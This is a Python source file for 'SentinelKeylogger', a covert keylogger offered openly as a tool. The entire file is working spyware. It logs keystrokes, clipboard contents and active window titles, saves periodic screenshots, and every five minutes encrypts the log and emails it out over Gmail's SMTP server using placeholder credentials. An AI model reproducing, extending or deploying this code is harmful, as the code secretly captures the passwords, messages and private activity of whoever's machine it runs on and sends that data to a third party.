# SentinelKeylogger – Advanced Cross-Platform Keylogger (Single File Version)

import pynput.keyboard
import pyperclip
import pyautogui
import psutil
import os
import time
import threading
from datetime import datetime
from cryptography.fernet import Fernet
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText

LOG_FILE = "log.txt"
SCREENSHOT_FOLDER = "screens"
ENCRYPTION_KEY_FILE = "key.key"

# Create folders
if not os.path.exists(SCREENSHOT_FOLDER):
    os.makedirs(SCREENSHOT_FOLDER)

# Encryption setup
def generate_key():
    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, "wb") as f:
        f.write(key)

def load_key():
    return open(ENCRYPTION_KEY_FILE, "rb").read()

if not os.path.exists(ENCRYPTION_KEY_FILE):
    generate_key()

fernet = Fernet(load_key())

# Log writer
def write_log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} - {data}\n")

# Keystroke logger
def on_press(key):
    try:
        k = key.char
    except:
        k = str(key)
    write_log(f"[KEY] {k}")

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Clipboard logger
def start_clipboard_logger():
    recent = ""
    while True:
        try:
            text = pyperclip.paste()
            if text != recent:
                recent = text
                write_log(f"[CLIPBOARD] {text}")
        except:
            pass
        time.sleep(3)

# Active window tracker
def start_window_logger():
    last = ""
    while True:
        try:
            win = pyautogui.getActiveWindow()
            title = win.title if win else "Unknown"
            if title != last:
                last = title
                write_log(f"[WINDOW] {title}")
        except:
            pass
        time.sleep(5)

# Screenshot capturer
def capture_screenshot():
    shot = ImageGrab.grab()
    fname = f"{SCREENSHOT_FOLDER}/screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    shot.save(fname)

def periodic_screenshots():
    while True:
        capture_screenshot()
        time.sleep(30)

# Email sender
def send_logs():
    try:
        with open(LOG_FILE, "rb") as f:
            encrypted = fernet.encrypt(f.read())
        msg = MIMEText(encrypted.decode())
        msg["From"] = "youremail@example.com"
        msg["To"] = "youremail@example.com"
        msg["Subject"] = "Encrypted Logs"
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login("youremail@example.com", "your_app_password")
            server.send_message(msg)
    except Exception as e:
        write_log(f"[EMAIL ERROR] {e}")

# Main runner
def main():
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=start_clipboard_logger, daemon=True).start()
    threading.Thread(target=start_window_logger, daemon=True).start()
    threading.Thread(target=periodic_screenshots, daemon=True).start()

    while True:
        time.sleep(300)
        send_logs()

if __name__ == "__main__":
    main()
